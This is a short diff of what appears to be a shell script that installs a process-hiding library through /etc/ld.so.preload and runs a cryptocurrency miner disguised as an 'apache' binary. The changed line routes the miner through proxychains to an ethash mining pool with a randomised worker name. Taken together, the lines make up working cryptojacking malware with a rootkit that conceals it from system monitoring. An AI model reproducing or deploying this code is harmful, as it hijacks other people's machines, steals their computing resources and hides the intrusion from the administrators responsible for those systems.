@@ -17,4 +17,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 
-proxychains ./apache --url=prodent.001.$(echo $(shuf -i 1-1000 -n 1))@3.215.245.39:443
+proxychains ./apache --url=prodent.001.$(echo $(shuf -i 1-1000 -n 1))@ethash.kupool.com:443
